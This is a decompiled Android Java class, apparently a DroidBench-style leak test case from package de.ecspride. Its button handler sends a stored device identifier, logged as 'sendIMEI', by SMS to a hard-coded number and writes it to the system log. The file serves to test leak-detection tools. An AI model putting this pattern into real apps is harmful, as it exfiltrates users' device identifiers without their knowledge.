package de.ecspride;

import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;

class Button2$1
  implements View.OnClickListener
{
  Button2$1(Button2 paramButton2) {}
  
  public void onClick(View paramView)
  {
    SmsManager.getDefault().sendTextMessage("+49 1234", null, Button2.access$0(this$0), null, null);
    Log.i("TAG", "sendIMEI: " + Button2.access$0(this$0));
    Button2.access$1(this$0, null);
  }
}

/* Location:
 * Qualified Name:     de.ecspride.Button2.1
 * Java Class Version: 6 (50.0)
 * JD-Core Version:    0.7.1
 */